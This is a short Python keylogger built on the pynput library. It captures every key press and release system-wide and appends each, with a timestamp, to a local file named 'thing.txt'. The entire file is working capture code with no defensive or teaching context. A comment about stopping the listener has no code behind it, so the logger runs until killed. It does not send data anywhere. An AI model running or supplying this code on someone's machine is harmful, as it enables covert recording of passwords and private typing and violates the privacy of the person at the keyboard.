from pynput import keyboard
import datetime

# File to save keypresses
output_file = "thing.txt"

def log_to_file(message):
    with open(output_file, "a") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] {message}\n")

def on_press(key):
    try:
        log_to_file(f"Key {key.char} pressed")
    except AttributeError:
        log_to_file(f"Special key {key} pressed")

def on_release(key):
    log_to_file(f"Key {key} released")
     # Stops the listener

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()